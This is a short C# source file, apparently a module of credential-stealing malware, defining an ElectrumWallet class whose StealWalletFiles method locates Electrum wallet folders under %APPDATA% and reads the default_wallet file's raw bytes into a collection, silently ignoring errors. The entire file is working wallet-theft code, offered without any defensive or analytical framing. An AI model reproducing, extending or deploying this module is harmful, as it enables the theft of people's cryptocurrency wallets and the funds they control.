using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class ElectrumWallet : CryptoWalletBase
    {
        public ElectrumWallet()
        {
            walletName = "Electrum";
            
            // Common Electrum wallet paths
            walletPaths.Add("%APPDATA%\\Electrum\\wallets");
            walletPaths.Add("%APPDATA%\\Electrum\\testnet\\wallets");
        }
        
        public override Dictionary<string, byte[]> StealWalletFiles()
        {
            Dictionary<string, byte[]> wallets = base.StealWalletFiles();
            
            // Also check for default_wallet file
            try
            {
                string defaultWallet = Environment.ExpandEnvironmentVariables("%APPDATA%\\Electrum\\wallets\\default_wallet");
                if (File.Exists(defaultWallet))
                {
                    wallets["Electrum_default_wallet"] = File.ReadAllBytes(defaultWallet);
                }
            }
            catch { }
            
            return wallets;
        }
    }
}
